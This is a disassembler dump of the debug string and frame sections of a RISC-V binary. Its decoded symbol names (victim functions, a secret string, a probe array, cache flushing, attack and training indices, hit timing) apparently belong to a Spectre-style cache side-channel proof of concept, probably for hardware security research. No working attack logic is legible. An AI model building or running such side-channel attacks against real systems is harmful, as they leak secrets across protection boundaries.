 1b0:	692d                	.insn	2, 0x692d
 1b2:	696e                	.insn	2, 0x696e
 1b4:	6974                	.insn	2, 0x6974
 1b6:	6c61                	.insn	2, 0x6c61
 1b8:	7a69                	.insn	2, 0x7a69
 1ba:	6465                	.insn	2, 0x6465
 1bc:	692d                	.insn	2, 0x692d
 1be:	2d6e                	.insn	2, 0x2d6e
 1c0:	7362                	.insn	2, 0x7362
 1c2:	662d2073          	csrs	0x662,s10
 1c6:	7266                	.insn	2, 0x7266
 1c8:	6565                	.insn	2, 0x6565
 1ca:	6e617473          	csrrci	s0,0x6e6,2
 1ce:	6964                	.insn	2, 0x6964
 1d0:	676e                	.insn	2, 0x676e
 1d2:	2d20                	.insn	2, 0x2d20
 1d4:	6e66                	.insn	2, 0x6e66
 1d6:	75622d6f          	jal	s10,2292c <__rodata_end+0x1fe26>
 1da:	6c69                	.insn	2, 0x6c69
 1dc:	6974                	.insn	2, 0x6974
 1de:	006e                	.insn	2, 0x006e
 1e0:	6f6c                	.insn	2, 0x6f6c
 1e2:	676e                	.insn	2, 0x676e
 1e4:	6420                	.insn	2, 0x6420
 1e6:	6c62756f          	jal	a0,278ac <__rodata_end+0x24da6>
 1ea:	0065                	.insn	2, 0x0065
 1ec:	7461                	.insn	2, 0x7461
 1ee:	756f526b          	.insn	4, 0x756f526b
 1f2:	646e                	.insn	2, 0x646e
 1f4:	5f00                	.insn	2, 0x5f00
 1f6:	755f 6e69 3874      	.insn	6, 0x38746e69755f
 1fc:	745f 7300 7465      	.insn	6, 0x74657300745f
 202:	7366664f          	.insn	4, 0x7366664f
 206:	7465                	.insn	2, 0x7465
 208:	6700                	.insn	2, 0x6700
 20a:	6975                	.insn	2, 0x6975
 20c:	6564                	.insn	2, 0x6564
 20e:	7241                	.insn	2, 0x7241
 210:	6172                	.insn	2, 0x6172
 212:	0079                	.insn	2, 0x0079
 214:	6964                	.insn	2, 0x6964
 216:	6666                	.insn	2, 0x6666
 218:	6100                	.insn	2, 0x6100
 21a:	636e                	.insn	2, 0x636e
 21c:	6f68                	.insn	2, 0x6f68
 21e:	5672                	.insn	2, 0x5672
 220:	7261                	.insn	2, 0x7261
 222:	6400                	.insn	2, 0x6400
 224:	6d75                	.insn	2, 0x6d75
 226:	796d                	.insn	2, 0x796d
 228:	654d                	.insn	2, 0x654d
 22a:	006d                	.insn	2, 0x006d
 22c:	6574                	.insn	2, 0x6574
 22e:	706d                	.insn	2, 0x706d
 230:	7241                	.insn	2, 0x7241
 232:	6172                	.insn	2, 0x6172
 234:	4979                	.insn	2, 0x4979
 236:	646e                	.insn	2, 0x646e
 238:	7865                	.insn	2, 0x7865
 23a:	7700                	.insn	2, 0x7700
 23c:	7961                	.insn	2, 0x7961
 23e:	7366664f          	.insn	4, 0x7366664f
 242:	7465                	.insn	2, 0x7465
 244:	6800                	.insn	2, 0x6800
 246:	7469                	.insn	2, 0x7469
 248:	6449                	.insn	2, 0x6449
 24a:	0078                	.insn	2, 0x0078
 24c:	4974756f          	jal	a0,47ee2 <__rodata_end+0x453dc>
 250:	7864                	.insn	2, 0x7864
 252:	6100                	.insn	2, 0x6100
 254:	7474                	.insn	2, 0x7474
 256:	6361                	.insn	2, 0x6361
 258:	7864496b          	.insn	4, 0x7864496b
 25c:	7600                	.insn	2, 0x7600
 25e:	6369                	.insn	2, 0x6369
 260:	6974                	.insn	2, 0x6974
 262:	466d                	.insn	2, 0x466d
 264:	6e75                	.insn	2, 0x6e75
 266:	65740063          	beq	s0,s7,8a6 <_start-0x75a>
 26a:	706d                	.insn	2, 0x706d
 26c:	7241                	.insn	2, 0x7241
 26e:	6172                	.insn	2, 0x6172
 270:	4979                	.insn	2, 0x4979
 272:	646e                	.insn	2, 0x646e
 274:	7865                	.insn	2, 0x7865
 276:	6e49                	.insn	2, 0x6e49
 278:	7469                	.insn	2, 0x7469
 27a:	5f00                	.insn	2, 0x5f00
 27c:	755f 6e69 3374      	.insn	6, 0x33746e69755f
 282:	5f32                	.insn	2, 0x5f32
 284:	0074                	.insn	2, 0x0074
 286:	5f5f 6d74 0070      	.insn	6, 0x00706d745f5f
 28c:	7564                	.insn	2, 0x7564
 28e:	6d6d                	.insn	2, 0x6d6d
 290:	0079                	.insn	2, 0x0079
 292:	6c61                	.insn	2, 0x6c61
 294:	6769                	.insn	2, 0x6769
 296:	656e                	.insn	2, 0x656e
 298:	4d64                	.insn	2, 0x4d64
 29a:	6d65                	.insn	2, 0x6d65
 29c:	4700                	.insn	2, 0x4700
 29e:	554e                	.insn	2, 0x554e
 2a0:	4320                	.insn	2, 0x4320
 2a2:	3731                	.insn	2, 0x3731
 2a4:	3120                	.insn	2, 0x3120
 2a6:	2e322e33          	.insn	4, 0x2e322e33
 2aa:	2030                	.insn	2, 0x2030
 2ac:	6d2d                	.insn	2, 0x6d2d
 2ae:	69727473          	csrrci	s0,0x697,4
 2b2:	612d7463          	bgeu	s10,s2,8ba <_start-0x746>
 2b6:	696c                	.insn	2, 0x696c
 2b8:	2d206e67          	.insn	4, 0x2d206e67
 2bc:	616d                	.insn	2, 0x616d
 2be:	6962                	.insn	2, 0x6962
 2c0:	693d                	.insn	2, 0x693d
 2c2:	706c                	.insn	2, 0x706c
 2c4:	20663233          	.insn	4, 0x20663233
 2c8:	6d2d                	.insn	2, 0x6d2d
 2ca:	7574                	.insn	2, 0x7574
 2cc:	656e                	.insn	2, 0x656e
 2ce:	723d                	.insn	2, 0x723d
 2d0:	656b636f          	jal	t1,b6926 <__rodata_end+0xb3e20>
 2d4:	2074                	.insn	2, 0x2074
 2d6:	6d2d                	.insn	2, 0x6d2d
 2d8:	7369                	.insn	2, 0x7369
 2da:	2d61                	.insn	2, 0x2d61
 2dc:	63657073          	csrci	0x636,10
 2e0:	323d                	.insn	2, 0x323d
 2e2:	3130                	.insn	2, 0x3130
 2e4:	3139                	.insn	2, 0x3139
 2e6:	3132                	.insn	2, 0x3132
 2e8:	6d2d2033          	.insn	4, 0x6d2d2033
 2ec:	7261                	.insn	2, 0x7261
 2ee:	723d6863          	bltu	s10,gp,a1e <_start-0x5e2>
 2f2:	3376                	.insn	2, 0x3376
 2f4:	6932                	.insn	2, 0x6932
 2f6:	666d                	.insn	2, 0x666d
 2f8:	7a5f 6369 7273      	.insn	6, 0x727363697a5f
 2fe:	2d20                	.insn	2, 0x2d20
 300:	672d2067          	.insn	4, 0x672d2067
 304:	2d20                	.insn	2, 0x2d20
 306:	2d20304f          	.insn	4, 0x2d20304f
 30a:	6e66                	.insn	2, 0x6e66
 30c:	74732d6f          	jal	s10,33252 <__rodata_end+0x3074c>
 310:	6361                	.insn	2, 0x6361
 312:	72702d6b          	.insn	4, 0x72702d6b
 316:	6365746f          	jal	s0,5794c <__rodata_end+0x54e46>
 31a:	6f74                	.insn	2, 0x6f74
 31c:	2072                	.insn	2, 0x2072
 31e:	662d                	.insn	2, 0x662d
 320:	6f6e                	.insn	2, 0x6f6e
 322:	7a2d                	.insn	2, 0x7a2d
 324:	7265                	.insn	2, 0x7265
 326:	6e692d6f          	jal	s10,92a0c <__rodata_end+0x8ff06>
 32a:	7469                	.insn	2, 0x7469
 32c:	6169                	.insn	2, 0x6169
 32e:	696c                	.insn	2, 0x696c
 330:	657a                	.insn	2, 0x657a
 332:	2d64                	.insn	2, 0x2d64
 334:	6e69                	.insn	2, 0x6e69
 336:	622d                	.insn	2, 0x622d
 338:	2d207373          	csrrci	t1,0x2d2,0
 33c:	6666                	.insn	2, 0x6666
 33e:	6572                	.insn	2, 0x6572
 340:	7365                	.insn	2, 0x7365
 342:	6174                	.insn	2, 0x6174
 344:	646e                	.insn	2, 0x646e
 346:	6e69                	.insn	2, 0x6e69
 348:	662d2067          	.insn	4, 0x662d2067
 34c:	6f6e                	.insn	2, 0x6f6e
 34e:	622d                	.insn	2, 0x622d
 350:	6975                	.insn	2, 0x6975
 352:	746c                	.insn	2, 0x746c
 354:	6e69                	.insn	2, 0x6e69
 356:	7300                	.insn	2, 0x7300
 358:	7265                	.insn	2, 0x7265
 35a:	6169                	.insn	2, 0x6169
 35c:	5f6c                	.insn	2, 0x5f6c
 35e:	5f74756f          	jal	a0,48154 <__rodata_end+0x4564e>
 362:	6564                	.insn	2, 0x6564
 364:	656d0063          	beq	s10,s6,9a4 <_start-0x65c>
 368:	536d                	.insn	2, 0x536d
 36a:	7a69                	.insn	2, 0x7a69
 36c:	0065                	.insn	2, 0x0065
 36e:	69726573          	csrrsi	a0,0x697,4
 372:	6c61                	.insn	2, 0x6c61
 374:	6f5f 7475 635f      	.insn	6, 0x635f74756f5f
 37a:	6168                	.insn	2, 0x6168
 37c:	0072                	.insn	2, 0x0072
 37e:	656d                	.insn	2, 0x656d
 380:	416d                	.insn	2, 0x416d
 382:	6464                	.insn	2, 0x6464
 384:	0072                	.insn	2, 0x0072
 386:	69726573          	csrrsi	a0,0x697,4
 38a:	6c61                	.insn	2, 0x6c61
 38c:	6f5f 7475 685f      	.insn	6, 0x685f74756f5f
 392:	7865                	.insn	2, 0x7865
 394:	7400                	.insn	2, 0x7400
 396:	7261                	.insn	2, 0x7261
 398:	49746567          	.insn	4, 0x49746567
 39c:	7864                	.insn	2, 0x7864
 39e:	7400                	.insn	2, 0x7400
 3a0:	6d65                	.insn	2, 0x6d65
 3a2:	4170                	.insn	2, 0x4170
 3a4:	7272                	.insn	2, 0x7272
 3a6:	7961                	.insn	2, 0x7961
 3a8:	7600                	.insn	2, 0x7600
 3aa:	6369                	.insn	2, 0x6369
 3ac:	6974                	.insn	2, 0x6974
 3ae:	466d                	.insn	2, 0x466d
 3b0:	6e75                	.insn	2, 0x6e75
 3b2:	30305f63          	blez	gp,6d0 <_start-0x930>
 3b6:	7600                	.insn	2, 0x7600
 3b8:	6369                	.insn	2, 0x6369
 3ba:	6974                	.insn	2, 0x6974
 3bc:	466d                	.insn	2, 0x466d
 3be:	6e75                	.insn	2, 0x6e75
 3c0:	31305f63          	blez	s3,6de <_start-0x922>
 3c4:	7600                	.insn	2, 0x7600
 3c6:	6369                	.insn	2, 0x6369
 3c8:	6974                	.insn	2, 0x6974
 3ca:	466d                	.insn	2, 0x466d
 3cc:	6e75                	.insn	2, 0x6e75
 3ce:	32305f63          	blez	gp,70c <_start-0x8f4>
 3d2:	7600                	.insn	2, 0x7600
 3d4:	6369                	.insn	2, 0x6369
 3d6:	6974                	.insn	2, 0x6974
 3d8:	466d                	.insn	2, 0x466d
 3da:	6e75                	.insn	2, 0x6e75
 3dc:	33305f63          	blez	s3,71a <_start-0x8e6>
 3e0:	7600                	.insn	2, 0x7600
 3e2:	6369                	.insn	2, 0x6369
 3e4:	6974                	.insn	2, 0x6974
 3e6:	466d                	.insn	2, 0x466d
 3e8:	6e75                	.insn	2, 0x6e75
 3ea:	34305f63          	blez	gp,748 <_start-0x8b8>
 3ee:	6800                	.insn	2, 0x6800
 3f0:	7469                	.insn	2, 0x7469
 3f2:	6954                	.insn	2, 0x6954
 3f4:	656d                	.insn	2, 0x656d
 3f6:	5f650073          	.insn	4, 0x5f650073
 3fa:	7874                	.insn	2, 0x7874
 3fc:	0064                	.insn	2, 0x0064
 3fe:	6c66                	.insn	2, 0x6c66
 400:	7375                	.insn	2, 0x7375
 402:	4368                	.insn	2, 0x4368
 404:	6361                	.insn	2, 0x6361
 406:	6568                	.insn	2, 0x6568
 408:	7300                	.insn	2, 0x7300
 40a:	6365                	.insn	2, 0x6365
 40c:	6572                	.insn	2, 0x6572
 40e:	5374                	.insn	2, 0x5374
 410:	7274                	.insn	2, 0x7274
 412:	6e69                	.insn	2, 0x6e69
 414:	756e0067          	jr	1878(t3)
 418:	536d                	.insn	2, 0x536d
 41a:	7465                	.insn	2, 0x7465
 41c:	656c4373          	.insn	4, 0x656c4373
 420:	7261                	.insn	2, 0x7261
 422:	6600                	.insn	2, 0x6600
 424:	756c                	.insn	2, 0x756c
 426:	6a5f6873          	csrrsi	a6,0x6a5,30
 42a:	6e75                	.insn	2, 0x6e75
 42c:	696d006b          	.insn	4, 0x696d006b
 430:	756e                	.insn	2, 0x756e
 432:	6c665f73          	csrrwi	t5,0x6c6,12
 436:	6761                	.insn	2, 0x6761
 438:	6d00                	.insn	2, 0x6d00
 43a:	7869                	.insn	2, 0x7869
 43c:	6465                	.insn	2, 0x6465
 43e:	695f 6f00 7475      	.insn	6, 0x74756f00695f
 444:	7570                	.insn	2, 0x7570
 446:	4174                	.insn	2, 0x4174
 448:	6464                	.insn	2, 0x6464
 44a:	0072                	.insn	2, 0x0072
 44c:	78644963          	blt	s0,t1,bde <_start-0x422>
 450:	6300                	.insn	2, 0x6300
 452:	6361                	.insn	2, 0x6361
 454:	6568                	.insn	2, 0x6568
 456:	7441                	.insn	2, 0x7441
 458:	6174                	.insn	2, 0x6174
 45a:	6f006b63          	bltu	zero,a6,b50 <_start-0x4b0>
 45e:	7475                	.insn	2, 0x7475
 460:	6954                	.insn	2, 0x6954
 462:	656d                	.insn	2, 0x656d
 464:	69760073          	.insn	4, 0x69760073
 468:	6d697463          	bgeu	s2,s6,b30 <_start-0x4d0>
 46c:	7546                	.insn	2, 0x7546
 46e:	636e                	.insn	2, 0x636e
 470:	6e49                	.insn	2, 0x6e49
 472:	7469                	.insn	2, 0x7469
 474:	7300                	.insn	2, 0x7300
 476:	7265                	.insn	2, 0x7265
 478:	6169                	.insn	2, 0x6169
 47a:	5f6c                	.insn	2, 0x5f6c
 47c:	74696177          	.insn	4, 0x74696177
 480:	7000                	.insn	2, 0x7000
 482:	6f72                	.insn	2, 0x6f72
 484:	6562                	.insn	2, 0x6562
 486:	7241                	.insn	2, 0x7241
 488:	6172                	.insn	2, 0x6172
 48a:	0079                	.insn	2, 0x0079
 48c:	66696873          	csrrsi	a6,0x666,18
 490:	5f74                	.insn	2, 0x5f74
 492:	6162                	.insn	2, 0x6162
 494:	72006573          	csrrsi	a0,0x720,0
 498:	7365                	.insn	2, 0x7365
 49a:	6c75                	.insn	2, 0x6c75
 49c:	7374                	.insn	2, 0x7374
 49e:	6d00                	.insn	2, 0x6d00
 4a0:	6961                	.insn	2, 0x6961
 4a2:	006e                	.insn	2, 0x006e

Disassembly of section .debug_frame:

00000000 <.debug_frame>:
   0:	000c                	.insn	2, 0x000c
   2:	0000                	.insn	2, 0x
   4:	ffff                	.insn	2, 0xffff
   6:	ffff                	.insn	2, 0xffff
   8:	7c010003          	lb	zero,1984(sp) # 120117c4 <__rodata_end+0x1200ecbe>
   c:	0d01                	.insn	2, 0x0d01
   e:	0002                	.insn	2, 0x0002
  10:	0020                	.insn	2, 0x0020
  12:	0000                	.insn	2, 0x
  14:	0000                	.insn	2, 0x
  16:	0000                	.insn	2, 0x
  18:	19bc                	.insn	2, 0x19bc
  1a:	0000                	.insn	2, 0x
  1c:	007c                	.insn	2, 0x007c
  1e:	0000                	.insn	2, 0x
  20:	0e44                	.insn	2, 0x0e44
  22:	4430                	.insn	2, 0x4430
  24:	0188                	.insn	2, 0x0188
  26:	0c44                	.insn	2, 0x0c44
  28:	0008                	.insn	2, 0x0008
  2a:	6802                	.insn	2, 0x6802
  2c:	0cc8                	.insn	2, 0x0cc8
  2e:	3002                	.insn	2, 0x3002
  30:	0e44                	.insn	2, 0x0e44
  32:	0000                	.insn	2, 0x
  34:	0020                	.insn	2, 0x0020
  36:	0000                	.insn	2, 0x
  38:	0000                	.insn	2, 0x
  3a:	0000                	.insn	2, 0x
  3c:	1a38                	.insn	2, 0x1a38
  3e:	0000                	.insn	2, 0x
  40:	006c                	.insn	2, 0x006c
  42:	0000                	.insn	2, 0x
  44:	0e44                	.insn	2, 0x0e44
  46:	4430                	.insn	2, 0x4430
  48:	0188                	.insn	2, 0x0188
  4a:	0c44                	.insn	2, 0x0c44
  4c:	0008                	.insn	2, 0x0008
  4e:	5802                	.insn	2, 0x5802
  50:	0cc8                	.insn	2, 0x0cc8
  52:	3002                	.insn	2, 0x3002
  54:	0e44                	.insn	2, 0x0e44
  56:	0000                	.insn	2, 0x
  58:	0024                	.insn	2, 0x0024
  5a:	0000                	.insn	2, 0x
  5c:	0000                	.insn	2, 0x
  5e:	0000                	.insn	2, 0x
  60:	1aa4                	.insn	2, 0x1aa4
  62:	0000                	.insn	2, 0x
  64:	007c                	.insn	2, 0x007c
  66:	0000                	.insn	2, 0x
  68:	0e44                	.insn	2, 0x0e44
  6a:	4820                	.insn	2, 0x4820
  6c:	0181                	.insn	2, 0x0181
  6e:	0288                	.insn	2, 0x0288
  70:	0c44                	.insn	2, 0x0c44
  72:	0008                	.insn	2, 0x0008
  74:	6002                	.insn	2, 0x6002
  76:	44c1                	.insn	2, 0x44c1
  78:	0cc8                	.insn	2, 0x0cc8
  7a:	2002                	.insn	2, 0x2002
  7c:	0e44                	.insn	2, 0x0e44
  7e:	0000                	.insn	2, 0x
  80:	000c                	.insn	2, 0x000c
  82:	0000                	.insn	2, 0x
  84:	ffff                	.insn	2, 0xffff
  86:	ffff                	.insn	2, 0xffff
  88:	7c010003          	lb	zero,1984(sp)
  8c:	0d01                	.insn	2, 0x0d01
  8e:	0002                	.insn	2, 0x0002
  90:	0020                	.insn	2, 0x0020
  92:	0000                	.insn	2, 0x
  94:	0080                	.insn	2, 0x0080
  96:	0000                	.insn	2, 0x
  98:	1b20                	.insn	2, 0x1b20
  9a:	0000                	.insn	2, 0x
  9c:	007c                	.insn	2, 0x007c
  9e:	0000                	.insn	2, 0x
  a0:	0e44                	.insn	2, 0x0e44
  a2:	4430                	.insn	2, 0x4430
  a4:	0188                	.insn	2, 0x0188
  a6:	0c44                	.insn	2, 0x0c44
  a8:	0008                	.insn	2, 0x0008
  aa:	6802                	.insn	2, 0x6802
  ac:	0cc8                	.insn	2, 0x0cc8
  ae:	3002                	.insn	2, 0x3002
  b0:	0e44                	.insn	2, 0x0e44
  b2:	0000                	.insn	2, 0x
  b4:	0020                	.insn	2, 0x0020
  b6:	0000                	.insn	2, 0x
  b8:	0080                	.insn	2, 0x0080
  ba:	0000                	.insn	2, 0x
  bc:	1b9c                	.insn	2, 0x1b9c
  be:	0000                	.insn	2, 0x
  c0:	001c                	.insn	2, 0x001c
  c2:	0000                	.insn	2, 0x
  c4:	0e44                	.insn	2, 0x0e44
  c6:	4410                	.insn	2, 0x4410
  c8:	0188                	.insn	2, 0x0188
  ca:	0c44                	.insn	2, 0x0c44
  cc:	0008                	.insn	2, 0x0008
  ce:	c848                	.insn	2, 0xc848
  d0:	020c                	.insn	2, 0x020c
  d2:	4410                	.insn	2, 0x4410
  d4:	000e                	.insn	2, 0x000e
  d6:	0000                	.insn	2, 0x
  d8:	0028                	.insn	2, 0x0028
  da:	0000                	.insn	2, 0x
  dc:	0080                	.insn	2, 0x0080
  de:	0000                	.insn	2, 0x
  e0:	1bb8                	.insn	2, 0x1bb8
  e2:	0000                	.insn	2, 0x
  e4:	0110                	.insn	2, 0x0110
  e6:	0000                	.insn	2, 0x
  e8:	0e44                	.insn	2, 0x0e44
  ea:	08b0                	.insn	2, 0x08b0
  ec:	8148                	.insn	2, 0x8148
  ee:	8801                	.insn	2, 0x8801
  f0:	4402                	.insn	2, 0x4402
  f2:	080c                	.insn	2, 0x080c
  f4:	0200                	.insn	2, 0x0200
  f6:	c1f4                	.insn	2, 0xc1f4
  f8:	c844                	.insn	2, 0xc844
  fa:	020c                	.insn	2, 0x020c
  fc:	08b0                	.insn	2, 0x08b0
  fe:	0e44                	.insn	2, 0x0e44
 100:	0000                	.insn	2, 0x
 102:	0000                	.insn	2, 0x
 104:	0024                	.insn	2, 0x0024
 106:	0000                	.insn	2, 0x
 108:	0080                	.insn	2, 0x0080
 10a:	0000                	.insn	2, 0x
 10c:	1cc8                	.insn	2, 0x1cc8
 10e:	0000                	.insn	2, 0x
 110:	0220                	.insn	2, 0x0220
 112:	0000                	.insn	2, 0x
 114:	0e44                	.insn	2, 0x0e44
 116:	4850                	.insn	2, 0x4850
 118:	0181                	.insn	2, 0x0181
 11a:	0288                	.insn	2, 0x0288
 11c:	0c44                	.insn	2, 0x0c44
 11e:	0008                	.insn	2, 0x0008
 120:	c1020403          	lb	s0,-1008(tp) # fffffc10 <stack_top+0x7ffdfc10>
 124:	c844                	.insn	2, 0xc844
 126:	020c                	.insn	2, 0x020c
 128:	4450                	.insn	2, 0x4450
 12a:	000e                	.insn	2, 0x000e
 12c:	0024                	.insn	2, 0x0024
 12e:	0000                	.insn	2, 0x
 130:	0080                	.insn	2, 0x0080
 132:	0000                	.insn	2, 0x
 134:	1ee8                	.insn	2, 0x1ee8
 136:	0000                	.insn	2, 0x
 138:	0044                	.insn	2, 0x0044
 13a:	0000                	.insn	2, 0x
 13c:	0e44                	.insn	2, 0x0e44
 13e:	4830                	.insn	2, 0x4830
 140:	0181                	.insn	2, 0x0181
 142:	0288                	.insn	2, 0x0288
 144:	0c44                	.insn	2, 0x0c44
 146:	0008                	.insn	2, 0x0008
 148:	c168                	.insn	2, 0xc168
 14a:	c844                	.insn	2, 0xc844
 14c:	020c                	.insn	2, 0x020c
 14e:	4430                	.insn	2, 0x4430
 150:	000e                	.insn	2, 0x000e
 152:	0000                	.insn	2, 0x
 154:	0020                	.insn	2, 0x0020
 156:	0000                	.insn	2, 0x
 158:	0080                	.insn	2, 0x0080
 15a:	0000                	.insn	2, 0x
 15c:	1f2c                	.insn	2, 0x1f2c
 15e:	0000                	.insn	2, 0x
 160:	0100                	.insn	2, 0x0100
 162:	0000                	.insn	2, 0x
 164:	0e44                	.insn	2, 0x0e44
 166:	4440                	.insn	2, 0x4440
 168:	0188                	.insn	2, 0x0188
 16a:	0c44                	.insn	2, 0x0c44
 16c:	0008                	.insn	2, 0x0008
 16e:	ec02                	.insn	2, 0xec02
 170:	0cc8                	.insn	2, 0x0cc8
 172:	4002                	.insn	2, 0x4002
 174:	0e44                	.insn	2, 0x0e44
 176:	0000                	.insn	2, 0x
 178:	0020                	.insn	2, 0x0020
 17a:	0000                	.insn	2, 0x
 17c:	0080                	.insn	2, 0x0080
 17e:	0000                	.insn	2, 0x
 180:	202c                	.insn	2, 0x202c
 182:	0000                	.insn	2, 0x
 184:	00dc                	.insn	2, 0x00dc
 186:	0000                	.insn	2, 0x
 188:	0e44                	.insn	2, 0x0e44
 18a:	4420                	.insn	2, 0x4420
 18c:	0188                	.insn	2, 0x0188
 18e:	0c44                	.insn	2, 0x0c44
 190:	0008                	.insn	2, 0x0008
 192:	c802                	.insn	2, 0xc802
 194:	0cc8                	.insn	2, 0x0cc8
 196:	2002                	.insn	2, 0x2002
 198:	0e44                	.insn	2, 0x0e44
 19a:	0000                	.insn	2, 0x
 19c:	0020                	.insn	2, 0x0020
 19e:	0000                	.insn	2, 0x
 1a0:	0080                	.insn	2, 0x0080
 1a2:	0000                	.insn	2, 0x
 1a4:	2108                	.insn	2, 0x2108
 1a6:	0000                	.insn	2, 0x
 1a8:	00dc                	.insn	2, 0x00dc
 1aa:	0000                	.insn	2, 0x
 1ac:	0e44                	.insn	2, 0x0e44
 1ae:	4420                	.insn	2, 0x4420
 1b0:	0188                	.insn	2, 0x0188
 1b2:	0c44                	.insn	2, 0x0c44
 1b4:	0008                	.insn	2, 0x0008
 1b6:	c802                	.insn	2, 0xc802
 1b8:	0cc8                	.insn	2, 0x0cc8
 1ba:	2002                	.insn	2, 0x2002
 1bc:	0e44                	.insn	2, 0x0e44
 1be:	0000                	.insn	2, 0x
 1c0:	0020                	.insn	2, 0x0020
 1c2:	0000                	.insn	2, 0x
 1c4:	0080                	.insn	2, 0x0080
 1c6:	0000                	.insn	2, 0x
 1c8:	21e4                	.insn	2, 0x21e4
 1ca:	0000                	.insn	2, 0x
 1cc:	00dc                	.insn	2, 0x00dc
 1ce:	0000                	.insn	2, 0x
 1d0:	0e44                	.insn	2, 0x0e44
 1d2:	4420                	.insn	2, 0x4420
 1d4:	0188                	.insn	2, 0x0188
 1d6:	0c44                	.insn	2, 0x0c44
 1d8:	0008                	.insn	2, 0x0008
 1da:	c802                	.insn	2, 0xc802
 1dc:	0cc8                	.insn	2, 0x0cc8
 1de:	2002                	.insn	2, 0x2002
 1e0:	0e44                	.insn	2, 0x0e44
 1e2:	0000                	.insn	2, 0x
 1e4:	0020                	.insn	2, 0x0020
 1e6:	0000                	.insn	2, 0x
 1e8:	0080                	.insn	2, 0x0080
 1ea:	0000                	.insn	2, 0x
 1ec:	22c0                	.insn	2, 0x22c0
 1ee:	0000                	.insn	2, 0x
 1f0:	00dc                	.insn	2, 0x00dc
 1f2:	0000                	.insn	2, 0x
 1f4:	0e44                	.insn	2, 0x0e44
 1f6:	4420                	.insn	2, 0x4420
 1f8:	0188                	.insn	2, 0x0188
 1fa:	0c44                	.insn	2, 0x0c44
 1fc:	0008                	.insn	2, 0x0008
 1fe:	c802                	.insn	2, 0xc802
 200:	0cc8                	.insn	2, 0x0cc8
 202:	2002                	.insn	2, 0x2002
 204:	0e44                	.insn	2, 0x0e44
 206:	0000                	.insn	2, 0x
 208:	0020                	.insn	2, 0x0020
 20a:	0000                	.insn	2, 0x
 20c:	0080                	.insn	2, 0x0080
 20e:	0000                	.insn	2, 0x
 210:	239c                	.insn	2, 0x239c
 212:	0000                	.insn	2, 0x
 214:	00dc                	.insn	2, 0x00dc
 216:	0000                	.insn	2, 0x
 218:	0e44                	.insn	2, 0x0e44
 21a:	4420                	.insn	2, 0x4420
 21c:	0188                	.insn	2, 0x0188
 21e:	0c44                	.insn	2, 0x0c44
 220:	0008                	.insn	2, 0x0008
 222:	c802                	.insn	2, 0xc802
 224:	0cc8                	.insn	2, 0x0cc8
 226:	2002                	.insn	2, 0x2002
 228:	0e44                	.insn	2, 0x0e44
 22a:	0000                	.insn	2, 0x
 22c:	0020                	.insn	2, 0x0020
 22e:	0000                	.insn	2, 0x
 230:	0080                	.insn	2, 0x0080
 232:	0000                	.insn	2, 0x
 234:	2478                	.insn	2, 0x2478
 236:	0000                	.insn	2, 0x
 238:	00dc                	.insn	2, 0x00dc
 23a:	0000                	.insn	2, 0x
 23c:	0e44                	.insn	2, 0x0e44
 23e:	4420                	.insn	2, 0x4420
 240:	0188                	.insn	2, 0x0188
 242:	0c44                	.insn	2, 0x0c44
 244:	0008                	.insn	2, 0x0008
 246:	c802                	.insn	2, 0xc802
 248:	0cc8                	.insn	2, 0x0cc8
 24a:	2002                	.insn	2, 0x2002
 24c:	0e44                	.insn	2, 0x0e44
 24e:	0000                	.insn	2, 0x
 250:	0024                	.insn	2, 0x0024
 252:	0000                	.insn	2, 0x
 254:	0080                	.insn	2, 0x0080
 256:	0000                	.insn	2, 0x
 258:	2554                	.insn	2, 0x2554
 25a:	0000                	.insn	2, 0x
 25c:	01a8                	.insn	2, 0x01a8
 25e:	0000                	.insn	2, 0x
 260:	0e44                	.insn	2, 0x0e44
 262:	4830                	.insn	2, 0x4830
 264:	0188                	.insn	2, 0x0188
 266:	0289                	.insn	2, 0x0289
 268:	0c44                	.insn	2, 0x0c44
 26a:	0008                	.insn	2, 0x0008
 26c:	c8018c03          	lb	s8,-896(gp)
 270:	020c                	.insn	2, 0x020c
 272:	4430                	.insn	2, 0x4430
 274:	44c9                	.insn	2, 0x44c9
 276:	000e                	.insn	2, 0x000e
 278:	0024                	.insn	2, 0x0024
 27a:	0000                	.insn	2, 0x
 27c:	0080                	.insn	2, 0x0080
 27e:	0000                	.insn	2, 0x
 280:	26fc                	.insn	2, 0x26fc
 282:	0000                	.insn	2, 0x
 284:	0404                	.insn	2, 0x0404
 286:	0000                	.insn	2, 0x
 288:	0e44                	.insn	2, 0x0e44
 28a:	4830                	.insn	2, 0x4830
 28c:	0181                	.insn	2, 0x0181
 28e:	0288                	.insn	2, 0x0288
 290:	0c44                	.insn	2, 0x0c44
 292:	0008                	.insn	2, 0x0008
 294:	c103e803          	.insn	4, 0xc103e803
 298:	c844                	.insn	2, 0xc844
 29a:	020c                	.insn	2, 0x020c
 29c:	4430                	.insn	2, 0x4430
 29e:	000e                	.insn	2, 0x000e
